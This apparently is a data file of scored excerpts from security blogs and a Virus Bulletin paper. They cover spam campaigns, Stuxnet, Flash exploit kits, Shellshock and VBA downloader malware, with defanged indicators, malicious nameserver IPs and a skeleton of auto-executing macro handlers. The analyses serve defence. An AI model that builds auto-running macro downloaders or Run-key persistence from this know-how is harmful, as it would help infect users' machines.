ns3.fanatiaono.ru – 132.248.49.112
ns4.fanatiaono.ru – 209.51.221.247
ns1.analunakis.ru – 62.76.178.233
ns2.analunakis.ru – 41.168.5.140
ns3.analunakis.ru – 132.248.49.112
ns4.analunakis.ru – 209.51.221.247
This isn’t the first time that we intercept a Facebook notifications themed malicious attack. During October, 2012, we intercepted two – “Bogus Facebook notifications lead to malware“; “Cybercriminals spamvertise millions of bogus Facebook notifications, serve malware“.
You can also consider going through previously analyzed Facebook themed malicious campaigns:",0.022183249598194954
"Malware campaign spreading via Facebook direct messages spotted in the wild
Spamvertised ‘You have 1 lost message on Facebook’ campaign leads to pharmaceutical scams",0.011459857002828255
"If users feel they received a bogus email that may not be coming from Facebook, they can alert Facebook by forwarding the message to phish@fb.com. In addition, users can check to see if their account has been compromised by visiting www.facebook.com/hacked.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.012023170695271035
SecurID Thoughts,0.008761145635975742
"Posted by Roger on 1 April 2011, 8:22 pm",0.012794179879564549
"Today was my first day back at work since the 18th.   Anything happen in the world of security while I was gone?
What you say?   RSA was breached?  It has been funny following the obligatory reactions in the absence of actual information.   RSA’s first suggestion for action could have been written before the event.
One of the articles that piqued my interest was Larry Seltzer “RSA Hack Demonstrates Superiority of Cell Phone as 2nd Factor”  This article pronounced security tokens like securID a niche market that will further be eroded by this loss of confidence.  He promotes PhoneFactor as a viable alternative.
PhoneFactor upon request sends you a token via SMS message.  Like securID there can be a PIN.   It can also call you and read you  the tokencode.   What happens when the power goes out?   Weather events are when people are more likely to be working remotely.   In snowstorms this winter we had people without power for days.   Many people don’t have POTS as a backup anymore.   They only have the cell or they use a form of VOIP (Vonage or ISP provided phone service).  One could also be concerned about the transmission of the tokencode over an insecure medium.
But this isn’t about PhoneFactor.   It is about RSA.   Gartner analyst Avivah Litan reports, RSA held a conference call today with industry analysts.  The recently patched Adobe Flash vulnerability, CVE-2011-0609, was used in this attack.   Adobe had reported this vulnerability being exploited in the wild prior to patching.   A Flash file inside an Excel file was used in the initial part of the attack.
This email was sent to the spam folder at RSA.   Sounds like a good argument for not allowing users to review their detected spam.
With this attack it becomes ever more important that the PIN not be written down and left with the card.    Security conscious companies are doing the only thing they can do in the short term.   They require longer PINs and enable PIN expiration.   This is going to lead to more writing down of the PIN.   I feel like this incident is being used to justify what should have been done in the first place. (requiring PIN changes, and longer PINs).
If companies feel they need to change out cards to be secure, even if those cards were free there is high cost in the change over.   This will lead to people considering other changes.   That SmartCard program that once seemed so onerous and expensive wont seem as bad.   The time to be making those changes isn’t while the ink is still wet on the security advisory.
Security projects like SIEM, user behavior monitoring, and DLP that were once extravegant expenses are beginning to look like a crucial part of a layered approach to defenses.
But still, it is the basics.
",0.020914171690460726
"(Windows) Shellshocked, Or Why Win32/Stuxnet Sux…
...But that doesn't mean that this particular attack is going to vanish any time soon, AV detection notwithstanding. Now that particular vulnerability is known, it's certainly going to be exploited by other parties, at least until Microsoft produce an effective fix for it, and it will affect some end users long after that...",0.010872023334463465
17 Jul 2010 - 03:45PM,0.011420092427021689
"…But that doesn’t mean that this particular attack is going to vanish any time soon, AV detection notwithstanding. Now that particular vulnerability is known, it’s certainly going to be exploited by other parties, at least until Microsoft produce an effective fix for it, and it will affect some end users long after that…",0.01113431752699956
[2nd update: added another batch of links for additional background.],0.019729532127614413
"We were getting used to seeing some positives in the whole Autorun exploiting malware thing: while Microsoft remains equivocal about rolling out the patch that mitigates it to XP and Vista users, at least there’s a fair amount of information around about how you can disable it.",0.01397976622037933
"The malware we detect as Win32/Stuxnet, unfortunately, is a worm (and rootkit) of a slightly different colour. It can propagate making use of a 0-day vulnerability described here and also listed by CVE as CVE-2010-2568, though there’s no real information at CVE right now – the Knowledgebase link in the Microsoft Advisory doesn’t go anywhere at the time of writing, either, so I guess these are placeholders.",0.011222134549772278
No Click Necessary,0.008943255602292588
"The biggest problem is that Windows (specifically, the Windows Shell) can be tricked into executing malicious code presented in a specially-crafted shortcut (.LNK) file linking, in turn, to a malicious DLL (Dynamic Link Library). (We detect such shortcuts as LNK/Autostart.A.)",0.014060012443544045
"Microsoft’s advisory states that the malcode is executed when the icon is clicked, but this is misleading: because the problem is in the way that Windows Shell fails to parse the shortcut correctly when it loads the icon, it isn’t necessary to click the icon for the malicious code to be executed.",0.008643745048052098
"The advisory also suggests that for systems where Autoplay is disabled, the victim must manually browse to the root directory of the infected device (normally, using Windows Explorer). While this is true as far as it goes, research indicates that this is not much of a mitigation. The code will still be executed without any action on the part of the user once that folder is opened to access whatever legitimate files are on the device.",0.011348091842756425
"It’s Not A Bug, It’s …..",0.009193390407045143
This malware has a number of interesting features.,0.018543750972165873
"Two of the drivers being dropped were digitally signed by Realtek Semiconductor, a legitimate company, which should cause some consternation among those who think that code signing is a complete replacement for anti-malware products. (The certificate has since been revoked by Verisign.)
The attack code has been extensively used around the globe to penetrate SCADA (Supervisory Control And Data Acquisition) systems used for running major industrial process, infrastructural processes such as power generation, and other facility processes.
Threat volumes, according to our own ThreatSense.Net® early warning system are already high enough to indicate that infections have already spread well beyond the walls of industrial plants and power stations, and research has yielded some interesting distribution patterns. However, there’s further discussion on that at the end of this post. The following chart shows the relative distribution of reports by locale.",0.010852717451049099
There’s a little more discussion on what those figures might really mean at the end of this article.,0.015195405388285232
Thanks for Sharing,0.010534095327191073
"Note also that USB devices are not the only potential vector: network shares and webDAV shares can also be used to distribute malicious .LNKs. Affected platforms (essentially all current Windows versions) are listed in the advisory: it’s likely that there won’t be a patch for XP SP2 or Windows 2000, which have reached the end of their support life.",0.008350219300439887
And Now for the Good News,0.010608234756584567
Microsoft suggest three mitigations:,0.008708406470381402
"* disabling Autorun (always a good idea, but not much help in this instance)",0.013993328703531427
"* restricting user rights (adherence to the principle of least privilege, i.e. not giving users more privileges than they need, is something we’re quite keen on here, too)",0.02278376811034377
* blocking SMB connections on the perimeter firewall to reduce the risk from file shares,0.007059366085092389
"Microsoft also suggests two workarounds, and describes how to effect them:",0.008916970578091377
* disable the display of shortcuts,0.007653140804156799
* disable the WebClient service,0.006797893922127263
"Unfortunately, both these options will have significant impact on some Windows users, since the first involves modifying the Registry (eek!) and the second will impact on SharePoint users.",0.012064257374726495
"Chester Wisniewski suggests deploying a GPO (Group Policy Object) to prevent users from executing programs except from drive C: this won’t suit everyone, but certainly offers a viable alternative, especially in corporate environments.",0.013840711056292254
So What Do Those Figures Really Mean?,0.018401870154629574
Here’s the detail from that earlier pie chart:,0.009424059052617118
"United States
57.71%",0.011708920614033058
"Iran
30.00%",0.007799812618438984
"Russia
4.09%",0.008248244775662883
"Indonesia
3.04%",0.007849169989054827
"Faroe Islands
1.22%",0.007992502938591106
"United Kingdom
0.77%",0.008482021413135032
"Turkey
0.49%",0.007770896721545628
"Spain
0.44%",0.007670923421247422
"India
0.29%",0.008043721111618662
"Rest of the world
1.73%",0.009168843227818746
"However, while figures from Microsoft indicate somewhat similar rankings (a post here suggests that the US, Indonesia. India and Iran are the most reported locales), the post also shows figures factoring in MMPC-monitored machines, it shows the volumes of reports from Iran and Indonesia as being dramatically higher than the global average, while even the figures for the next-ranked countries – in descending order India, Ecuador, US, Pakistan/Lebanon (tied) and Taiwan – are far closer to the global average.",0.015356581715144202
"If the disparity in these statistics tells us anything at all – apart from how difficult it is to extrapolate meaningfully from quite large, self-selecting populations of protected machines to the entire Internet – it’s that there’s something quite complex and dynamic happening here. While this incident may have started with targeted attacks on SCADA sites, these seem to be disappearing into the background noise as the number of attempted attacks escalates.",0.013041501810503786
"There are aspects of the code suggesting that the original attacks originated with a ""normal"" software developer rather than with the criminal gangs responsible for most malcode, or even the government- or military-funded hacker groups we often associate with targeted attacks. It may be that what we’re seeing is a conventional software developer at the beginning of a learning curve.",0.011791476388095079
"The security industry has always avoided self-replicating code even for ""good"" projects and criminal malware developers have also moved away from self-replicating malware towards Trojans spread by a variety of other channels. And one of the most compelling reasons for that is that once self-replicating code is released, it’s difficult to exercise complete control over where it goes and what it does. For the bad guys, it has the additional disadvantage that as it becomes more prevalent and therefore more visible, its usefulness as a malicious resource is depleted by public awareness and the availability of protection.",0.011813740604883716
"But that doesn’t mean that this particular attack is going to vanish any time soon, AV detection notwithstanding. Now that particular vulnerability is known, it’s certainly going to be exploited by other parties, at least until Microsoft produce an effective fix for it, and it will affect some end users long after that.",0.011660479608155527
Acknowledgements,0.0103658076566161
"The real heavy lifting on this research was done by Juraj Malcho and his colleagues in Bratislava, and by Aleksander Matrosov in Russia, though for this article I’ve also drawn (of course) on research from others in the security community, including researchers from Internet Storm Center, Sophos, Kaspersky , F-Secure and Microsoft. No researcher is an island….",0.012471038820079605
Other Links,0.009922946638977859
"http://news.softpedia.com/news/Microsoft-Confirms-Zero-Day-Crticial-Vulnerability-147964.shtml
http://www.informationweek.com/news/security/attacks/showArticle.jhtml?articleID=225900068&cid=alert_art_sec_d_f
http://isc.sans.edu/diary.html?storyid=9181
http://www.theregister.co.uk/2010/07/16/windows_shortcut_trojan/
http://krebsonsecurity.com/2010/07/experts-warn-of-new-windows-shortcut-flaw/
http://www.kb.cert.org/vuls/id/940193
http://youtu.be/1UxN7WJFTVg
http://www.h-online.com/security/news/item/Trojan-spreads-via-new-Windows-hole-1038992.html
http://eddywillems.blogspot.com/2010/07/microsoft-lnk-usb-worm-rootkit-issue.html
http://www.h-online.com/security/news/item/Microsoft-confirms-USB-trojan-hole-1040028.html
http://go.theregister.com/i/cfh/http://www.theregister.co.uk/2010/07/19/win_shortcut_vuln/
http://blogs.technet.com/b/msrc/archive/2010/07/16/security-advisory-2286198-released.aspx",0.012881628665632694
"David Harley CITP FBCS CISSP      ESET Senior Research Fellow
",0.011179100245160778
"Critical vulnerabilities in Windows and Adobe Reader exposed by hacker
A hacker has published an extensive list of Adobe Reader and Windows vulnerabilities based on his research into a relatively obscure area of font management.",0.011742874490833555
24 Jun 2015 - 02:28PM,0.01109182421703614
A hacker has published an extensive list of Adobe Reader and Windows vulnerabilities based on his research into a relatively obscure area of font management.,0.01425708600474973
A hacker has published an extensive list of Adobe Reader and Windows vulnerabilities based on his research into a relatively obscure area of font management.,0.01425708600474973
"Google Project Zero hacker Mateusz Jurczyk found a total of 15 vulnerabilities, any of which could trigger remote code execution or privilege escalation in Adobe Reader or the Windows kernel. However, the two worst (detailed as CVE-2015-3052 for 32-bit and CVE-2015-0093 for 64-bit) exist in the Adobe Type Manager Font Driver, which has existed in the Windows kernel since Windows NT 4.",0.00927815428426182
"He told IT blog the The Register that the most serious, an ‘entirely reliable’ BLEND instruction exploit relates to the handling of CharStrings that are responsible for drawing the shape of each glyph at a particular point size.",0.013021113698147735
"“The extremely powerful primitive provided by the vulnerability – together with the fact that it affected all supported versions of both Adobe Reader and Microsoft Windows thus making it possible to create an exploit chain leading to a full system compromise with just a single bug – makes it one of the most interesting security issues I have discovered so far,” Jurczyk said.",0.010525900108136588
"“The video demonstrates reliable exploitation of a vulnerability in the handling of the BLEND instruction in Type 1 fonts, used in two stages to first achieve arbitrary code execution in Adobe Reader 11.0.10, and further escape the sandbox and elevate privileges to System by attacking the Adobe Type Manager Font Driver in the Windows 8.1 Update 1 32-bit (or 64-bit) kernel”, he continued.",0.009299477808801582
"In a blog post the researcher also shared his presentation from the Recon security conference this month called ‘One font vulnerability to rule them all: A story of cross-software ownage, shared codebases and advanced exploitation.’",0.011974200317180772
"As welivesecurity.com recently reported, Google has extended the disclosure period for vulnerabilities uncovered in its Project Zero program by an additional two weeks, if a vendor is planning a patch in the two weeks following the deadline. The additional 14 day ‘grace period’ for vendors will “improve industry response times to security bugs, but will result in softer landings for bugs marginally over deadline”, according to Google.
",0.013217029439321903
Newest Flash Player Exploit & Double Nuclear Exploit Kit Payload,0.009574067950409604
"<p>Yesterday, we blogged about a&nbsp;<a href=""http://blogs.websense.com.com/security-labs/popular-indonesian-tech-news... target=""_blank"">malvertising campaign affecting a popular Indonesian news site</a>&nbsp;and leading to the Nuclear Exploit Kit. Today we came across another compromised website that leads to the Nuclear Exploit Kit, but this time we received two malware payloads after&nbsp;the newest Adobe Flash Player vulnerability was exploited. It is worth noting that no user interaction was required at any point--simply visiting the compromised website was enough to end up with malware being executed on our machine.</p>
<p>Raytheon | Websense&reg;&nbsp;customers&nbsp;are protected against this threat via real-time&nbsp;analytics&nbsp;in ACE,&nbsp;the Websense&nbsp;<a href=""http://www.websense.com/content/websense-advanced-classification-engine.... rel=""nofollow"" target=""_blank"">Advanced Classification Engine</a>.</p>
<h2>Compromised Website</h2>
<p>While&nbsp;reviewing interesting hits on security-related events today, we noticed a website named&nbsp;<em>thisblewmymind[.]com</em>. The website&nbsp;claims to be &quot;viral media for the brain,&quot; which&nbsp;may be somewhat true since the site&nbsp;drops viruses on your computer. Google&nbsp;does identify&nbsp;the site as likely&nbsp;compromised:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/4336.blewmymind_google2.jpg"" style=""height:181px; width:576px"" /></p>
<p>According to SimilarWeb, this site is actually quite popular, recently receiving almost 2 million users per month:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/6787.blewmymind_similarweb.png-550x0.png"" style=""height:334px; width:549px"" /></p>
<p>Unfortunately for people browsing to this site, it is injected with&nbsp;obfuscated JavaScript that ends up leading to the Nuclear Exploit Kit and dropping malware.</p>
<h2>Flash Player Exploit</h2>
<p>The infection chain we saw resulted in&nbsp;Adobe Flash Player version 19.0.0.207 being exploited by the Nuclear Exploit Kit to drop malware. This means that the exploit is likely to be the newest Flash exploit, leveraging CVE-2015-7645, which was recently known to have been incorporated into the Nuclear and Angler exploit kits. In fact, the Nuclear Exploit Kit seems to be packaging up two different Flash Player exploits inside one parent SWF file (<a href=""https://www.virustotal.com/en/file/5988cc77852e0d9e56c407ecd60b753a62990... target=""_blank"">VirusTotal</a>), and dynamically choosing which one to load, depending on the current Flash Player version. If it detects version 18.0.0.203 or below,&nbsp;an exploit leveraging CVE-2015-5122 is&nbsp;used. Otherwise, the new exploit is&nbsp;chosen:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/1638.blewmymind_nuclear_swfexp.png-550x0.png"" style=""height:343px; width:494px"" /></p>
<p>We successfully managed to unpack the new SWF exploit, and found that it had been on&nbsp;<a href=""https://www.virustotal.com/en/file/e111ae9229d4538577afebd25c10ab9355158... target=""_blank"">VirusTotal</a>&nbsp;since 31 October.</p>
<h2>Malware Payloads</h2>
<p>It&#39;s not typical to see more than one payload dropped by an exploit kit, but in this instance both Gamarue and CryptoWall 3.0 were dropped and executed&nbsp;via the Flash Player exploit.</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/1715.blewmymind_capture.png"" style=""height:559px; width:1200px"" /></p>
<p>Gamarue is&nbsp;modular, plug-in based malware belonging to the Andromeda botnet. Its main intent is usually for credential theft. CryptoWall 3.0 is&nbsp;crypto ransomware that encrypts your files and demands payment in&nbsp;BitCoin to have them decrypted:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/5148.cryptowall3.0_ransom.png"" style=""height:661px; width:1009px"" /></p>
<h2>Indicators of Compromise</h2>
<p>Below are some indicators of compromise from the threat described in this blog:</p>
<p><em>hxxp://thisblewmymind[.]com -&nbsp;<strong>Compromised website</strong></em></p>
<p><em>hxxp://cdn[.]goroda235[.]pw/ -&nbsp;<strong>Malicious redirect</strong></em></p>
<p><em>hxxp://zadnicaberezu[.]tk/ -&nbsp;<strong>Nuclear Exploit Kit</strong></em></p>
<p><em>2ed1953d2b182a0319041e73f6489d4151475dff -&nbsp;<strong>Nuclear EK </strong><strong>SWF</strong>36356533f44d6107d49662c78a56149e2f359fcc -&nbsp;<strong>Nuclear EK SWF (unpacked)</strong></em></p>
<p><em>3d5682ac799cace0325ca5437445fd3c163ee4ff -&nbsp;<strong>Gamarue</strong></em></p>
<p><em>9d3cc04dc97d0791565cf69778ee864f8af5d7f7 -&nbsp;<strong>CryptoWall 3.0</strong></em></p>
<h2>Summary</h2>
<p>The&nbsp;Nuclear Exploit Kit operators seem to be looking to maximize their profits by dropping multiple pieces of malware onto machines, capitalizing on the new Adobe Flash Player exploit and compromising popular sites in order to infect as many users as possible.&nbsp;As always, it is important to ensure that your software is up to date, especially your browser and associated plug-ins like Adobe Flash Player.</p>
",0.021328104255176616
"Two recently patched Adobe Flash vulnerabilities now used in Exploit Kits
Two Flash vulnerabilities that were fixed by Adobe 2 weeks ago are now being used in exploit kits. This is in addition to a third vulnerability, CVE-2014-0556, that was patched in September and that has also been added to Nuclear EK last week.",0.014632062387278766
31 Oct 2014 - 04:12PM,0.011173299007865012
"Two Flash vulnerabilities that were fixed by Adobe 2 weeks ago are now being used in exploit kits. This is in addition to a third vulnerability, CVE-2014-0556, that was patched in September and that has also been added to Nuclear EK last week.",0.014644643568489046
"Two Flash vulnerabilities that were fixed by Adobe 2 weeks ago are now being used in exploit kits. This is in addition to a third vulnerability, CVE-2014-0556, that was patched in September and that has also been added to Nuclear EK last week.",0.014644643568489046
"Before we get into the nitty-gritty detail, we strongly encourage you to take a moment to check that your Flash player is up to date, we have created a step-by-step guide explaining how to do so which you can read here.",0.01286340088128568
"The first exploit, CVE-2014-0569, is a vulnerability in the handling of the Alchemy opcode casi32. The Alchemy opcodes are a set of memory-access opcodes that are used by the CrossBridge SDK (see endnote).",0.01036018626479962
"This exploit has already been seen in Fiesta, SweetOrange and FlashPack so far. Alchemy has been the source of 2 other recent exploits (CVE-2013-5330, CVE-2014-0497) and is also seen in other exploits as it can be used to create straightforward read and write primitives.",0.011200172701694266
The CVE of the second one has not yet been identified but the exploit structure is quite similar to CVE-2014-0515 and uses the method of corrupting the size attribute of a vector object to gain complete access to the memory space. It then also uses the Alchemy opcodes li32 and si32 to read or write at arbitrary addresses.,0.007097552707602595
On 32-bit systems the exploit then dynamically searches for ROP (Return Oriented Programming) gadgets in the Flash module as shown below.,0.010811083692306767
"However, on 64-bit systems the ROP gadgets are obtained by computing a hash of the Flash version string and doing a lookup in a pre-computed table that is included with the exploit. This technique was also seen in CVE-2014-0497 but now supports 111 different versions of Flash, up from 20 in the earlier exploit. Whoever developed it went through a lot of effort to ensure it would work on as many systems as possible. This exploit has been seen in Angler and Astrum EK so far, and others will likely follow suit.",0.011147017282669092
"It seems quite clear that Flash has replaced Java as the target of choice for exploits on the Web : The last time a new Java exploit was added to exploit kits was more than a year ago. This is the 6th flaw in Flash being added to exploit kits in the last year, and there are other Flash vulnerabilities like CVE-2014-0502 that have not been added to kits but have been exploited in targeted attacks.",0.013568718948066327
"The exploitation love affair with Java ended not because of significant improvements to its security (Oracle fixed 8 severe vulnerabilities in July) but when browsers such as Firefox and Chrome started disabling the plugin by default and the latest versions of Java started displaying security prompts before launching applets. Perhaps it is time to consider applying a similar strategy for Flash. In the meantime, you can configure your browser to selectively load Flash objects on pages. You can see how to update Adobe Flash here.",0.010847272608289993
"For more details about Alchemy as well as in-depth analysis of some of the Flash vulnerabilities mentioned in this paper, I recommend the paper “Ubiquitous Flash, Ubiquitous Exploits, Ubiquitous Mitigation” by Chun Feng and Elia Florio which is now available on the Virus Bulletin website.
",0.014995719893210468
"Malvertising campaign delivers two exploit kits, same payload
Malvertising remains a favourite distribution platform for pushing out malware and we typically see certain exploit kits associated with particular campaigns. As a rule of thumb, the larger or more sophisticated the malvertising is, the better (stealthy, featuring the latest vulnerabilities) the exploit kit is. This isn’t surprising after all, as criminals want to maintain the same quality along the malware distribution chain.
It is however a little strange when you see an attack making use of two different exploit kits. This has happened in the past, sometimes by accident, but remains an oddity. The case we are looking at today does not appear to be a fluke though because the payload being served by each EK is identical, making this more likely a deliberate action either for testing purposes or to increase infection rates.
The traffic capture below shows how the same browser session spawned two different exploit kits: RIG EK and Sundown EK:",0.012286351846255816
"To find out where exactly this is happening, we need to look into a piece of JavaScript which was encoded to keep the code away from prying eyes. There is even a little bit of social engineering to trick users into enabling JavaScript if they haven’t.",0.013032579358517649
"The first thought that comes to mind is that someone got greedy and stuffed several iframes to maximize on payout per redirection. While this could be true, if we look at the payload delivered by both exploit kits in this scenario we notice that it is exactly the same with the only difference being that RIG encrypts the payload in transit.",0.010552743052178681
"This sample is the same backdoor that turns off the Windows Security Center which we covered in a previous blog about RIG EK.
Using two different weapons to deliver the same threat makes little sense unless it is done to leverage the capabilities of each exploit kit. Sundown EK does feature the recently patched IE zero day (CVE-2016-0189) while RIG has a newer Flash exploit, up to version 20.0.0228 with CVE-2015-8651. (Sundown still trails behind with Flash up to 18.0.0.203, CVE-2015-5122).
It’s possible that the actor behind this is doing some kind of testing or simply wants to maximize the infection rates by combining both EKs. It’s not very elegant or optimal but these days it doesn’t really seem to matter when applied to low quality traffic.
Malwarebytes Anti-Exploit blocks both exploit kits.
IOCs:
f0381b0b08ddadaa9234183fedd5ba3b3aa011a71b44de4dcbed86a584612fe6
",0.013827673611318647
What you need to know about the Bash “Shellshock” vulnerability,0.008633423470814194
"Written by
Editor",0.007990427730288352
"September 25, 2014",0.008497712871426977
Network Partners Products & Services Server Support Bash Shellshock Vulnerabilities,0.007484464238251554
"In the light of the recent Bash vulnerability known as “Shellshock” (CVE-2014-6271 and CVE-2014-7169), here’s the reality instead of the hype.
Shellshock is a newly-discovered vulnerability in Bash (the Bourne Again Shell), one of the most commonly used shells on Linux, UNIX and OS X.
Although it can be exploited in some cases, the good news is that not all implementations can be exploited, and only certain services and applications allow a hacker to exploit this issue.",0.011561903458110923
"See our articles and other resources on Naked Security and at sophos.com/shellshock for an explanation of the vulnerability itself.
In addition, we have examined our products and we are confident that the Shellshock vulnerability can’t be exploited in any Sophos product.
As far as we’re aware, we don’t have any servers or services that could have been exploited due to his bug. This includes our internal business systems, Sophos web servers, update servers, partner portal and support forums.
For the latest information on how this bug affects Sophos products, please refer to our knowledgebase article from Sophos Support.",0.01113869506012155
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
"VBA is not dead!
2014-07-02",0.009291396538561592
"Gabor Szappanos
Sophos
,
Hungary
Editor:
Martijn",0.00906241388508322
"Grooten
Abstract
In the past five years, macro malware could be considered practically extinct – thanks mostly to the security improvements introduced into Microsoft Office products. However, in recent months, a resurgence of malicious VBA macros has been observed – this time, not self-replicating viruses, but simple downloader trojan codes. Gabor Szappanos explains why VBA macro malware is not dead.
Copyright © 2014 Virus Bulletin",0.013647837751421754
"VBA macro malware was the dominant beast of the second half of the 1990s. This was the era of the simple WordBasic and later VBA macro viruses, the latter starting their sharp rise on the prevalence lists with the appearance of Concept, and then slowly declining after 2001, with occasional appearances lower down the prevalence charts in the years that followed. Figure 1 shows virus prevalence by type using data aggregated from Virus Bulletin’s monthly malware prevalence stats.
Figure 1. Virus prevalence by type.
In the past five years, macro viruses (and more generally, macro malware) could be considered practically extinct – thanks mostly to the security improvements that were introduced over that period of time to their main target, the Microsoft Office products.
However, this does not mean that our virus lab no longer encounters malicious Word documents and Excel workbooks – on the contrary, they have appeared on our virus radar quite frequently recently, but for a different reason. The new sightings are exploited documents using one of the Office vulnerabilities to drop or download some trojans or backdoors.
In the past couple of months, we have observed the resurgence of malicious VBA macros – this time, not self-replicating viruses, but simple downloader trojan codes.
Figure 2 shows the prevalence of the document-based infection reports received by our virus lab in a two-month period, covering March and April. We can see that, following the usual suspects (the CVE-2012-0158 and CVE-2010-3333 vulnerabilities), the VBA downloaders are the next most prevalent.
Figure 2. Distribution of malicious document infection vectors. (The ‘Word exploit’ category is a medley of exploited documents where we do not identify the exact exploits – however, in the majority of cases the exploit in use is CVE-2012-0158. The ‘no exploit’ category represents the same Zeus dropper RTF embedded executables, which require the user to double-click on the embedded object, as were mentioned in our 2014 Q1 trends report [1].)",0.015973149139637655
"Social engineering to the rescue
Visual Basic for Applications (VBA) is the macro programming environment of the Microsoft Office suite. Unlike the BASIC language, which is commonly perceived as a tool for beginners, VBA is quite a capable programming environment, as has been well demonstrated by macro viruses in their prime. However, the new wave of trojans described in this analysis doesn’t stretch the limits of the language, and in fact are very simplistic.
There is a complication that arises from using a VBA macro instead of an exploit to activate the infection process. In all Office suites starting from Office 2007, the execution of VBA macros is disabled by default. Consequently, the VBA code will not execute in newer versions of Office. Furthermore, the user is warned on the Word menu bar about the fact that macros have been disabled, as shown in Figure 3.
Figure 3. Word security warning.
But the malware authors were prepared for this obstacle, and overcame it by deploying simple social engineering tricks. They prepared the content of the documents in such a way that it would lure the recipient into enabling the execution of macros, and thus open the door for infection.
The malware authors have been busy – since the first appearance of this group of malware at the end of January 2014, at least 75 different variants have appeared. A wide variety of document content has been used – a few examples of which are described in the following paragraphs.
The most peculiar (and one that resembles the social engineering technique used in a Napolar distribution campaign at the end of 2013 [2]) is one in which a blurred transaction report is placed in the document content, encouraging the user to enable macros in order to access the full content. Conveniently, instructions are provided as to how to enable the macros, including an arrow pointing to the exact location where the user is supposed to click (seeFigure 4 ).
Figure 4. An arrow indicates where to click.
A different variation of the same approach with less fancy graphical content is shown in Figure 5.
Figure 5. Less fancy graphical content.
In other cases, content is marked as confidential and the user is encouraged to enable macros in order to view it, as shown in Figure 6.
Figure 6. Again, the user is instructed to enable macros.
Some examples are more minimalist in design, just giving out basic information, as shown in Figure 7.
Figure 7. More of a minimalist design.
A few of the samples we encountered were rather esoteric and vague, building upon the possibility that the receiver of the document will be as clueless about the point of the message as I was while reading it, and enable the macros purely through curiosity (see Figure 8).
Figure 8. Hoping the receiver will enable macros through curiosity.
Finally, there were cases where the malware authors left everything to the user’s imagination, giving no hints whatsoever (seeFigure 9 ).
Figure 9. No clue is given at all.
Regardless of the document content, the result is always the same: when the user is convinced to enable macros, the malware is ready to run, and on reopening the document, the VBA code will execute.",0.018068317747595097
"Multi-platform downloader code
The macro code, designed for automatic execution on opening, has the following structure (the order in which the individual functions appear and the name of the main function varies in the different variants):
Sub Auto_Open()
main_code()
End Sub
Sub main_code()
...
End Sub
Sub AutoOpen()
Auto_Open
End Sub
Sub Workbook_Open()
Auto_Open
End Sub",0.011050007889792268
"The main code is either in or called from the Auto_Open() function (which is executed when Excel is started). It is also invoked by the two other event handler functions, AutoOpen (which is invoked when a Word document is opened or Word is started) and Workbook_Open (which is invoked when an Excel workbook is opened).",0.027083229772435935
"Automacros
Microsoft Office programs provided a couple of ways a programmer could automatically execute macros when a specific event occurred. Some of them were tied to menu commands, while the automacros were connected to global application events. If the document contained macro procedures that were using one of the predefined, special names, these procedures were called by the Office application when the specific event occurred.
In Microsoft Word, these events were tied to starting the Word application (the event could be captured with a macro procedure named AutoExec), exiting Word (AutoExit), opening a document (AutoOpen), closing a document (AutoClose), or creating a new document (AutoNew).
Microsoft Excel had a wider selection of automatic macros, but included similar functions, such as starting Excel (Auto_Open), exiting Excel (Auto_Close), opening a workbook (Workbook_Open) and closing a workbook (Workbook_Close).
The structure of the trojan’s macro code ensures that the code is executed whenever the document is opened. Even though the code itself is cross-application, and Workbook_Open and Auto_Open could make it work in Excel, we have not observed any Excel workbooks in the distribution campaigns, only Word documents. Still, the dual structure covering both Word and Excel remains in the code – probably because the malware authors were too lazy to clean up the proof-of-concept code they used as ‘inspiration’ – exactly as we observed in last year’s Napolar campaign [2].
Although all of the samples we encountered followed the simple code template described above, we could distinguish two different strains among them.
The most common strain first called the UrlDownloadToFileA Windows function to download the final payload from a hard-coded URL, then saved it either to the %TEMP% folder or the %APPDATA% folder, and finally ran it using the Shell function. The dropped executable was usually registered for automatic execution during system start-up in one of the registry autorun locations, such as HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
Of the 74 documents we identified as belonging to the VBA downloader campaigns (at the time of writing this paper), the vast majority (60) belonged to this group.
On looking more deeply into the Word documents, some interesting characteristics could be observed. The metadata for each document includes document creation/modification times, revision number, and the author of the document. Looking into these properties revealed that the different documents were all attributed to the same author name, ‘tps’. It is reasonable to assume that the largest number of malicious documents come from the same source.
Figure 10. Looking at the file properties reveals the same author name.
Another useful piece of information is the name of the last user to have saved the document. This revealed some interesting names. Some just indicated the malware author’s favourite gadgets (‘DELL XPS’, ‘Xpera Z’), while others gave a hint as to the author’s name or nickname (‘Sammy Sam’, ‘Sammy2014’, ‘samy14’ and ‘samy2014’).
Figure 11. File last saved by ‘Sammy2014’.
Figure 12. File last saved by ‘Sammy Sam’.
Even more interesting is the fact that the creation date (highlighted in Figure 11 and Figure 12) was the same for most of these documents, as shown in Figure 13.
Figure 13. The creation date is the same for most of the documents.
This suggests that the development of this VBA trojan family started on 3 January, and the author didn’t bother to create a new document each time a new variant was created, but simply kept modifying the previous version by adding new social engineering content and occasionally changing the macro code – the increasing revision number also supports this assumption. Despite the fact that the last-saved-by name differs within the group, the creator is always ‘tps’ – this is another indication that this group of malware is derived from the same root document. The development of this strain appears to be an ongoing project, with the most recent version at revision number 91.
The rest of the 74 documents are likely to have been developed independently from the previous group. They use a different method, reminiscent of the VBScript downloaders from a decade ago. The remote file from the hard-coded URL is downloaded using the MSXML2.XMLHTTP object, and then the downloaded content is saved to the %APPDATA% folder or %USERPROFILE% folder, and finally executed using the Shell function.
In this strain of VBA downloaders, in each case, the author and the last-saved-by name are the same, and the creation and last-saved dates are roughly the same. This suggests a different mode of operation: rather than the same template document being modified over and over again, new ones were created most of the time.",0.020132678453595232
"Final payload
The downloaded payloads demonstrated a wide range of ordinary crimeware. We observed:
Zeus-related AutoIt executables:
https://www.virustotal.com/en/file/ace7db9b08d65b2c4 f0c011a54571039e45ca4010aaf482c73ee7ef860019d8c/analysis/
https://www.virustotal.com/en/file/8b6757271611fe6ff0f 758bffee20e488d19b583be0352584f191d21d241bcfd/analysis/
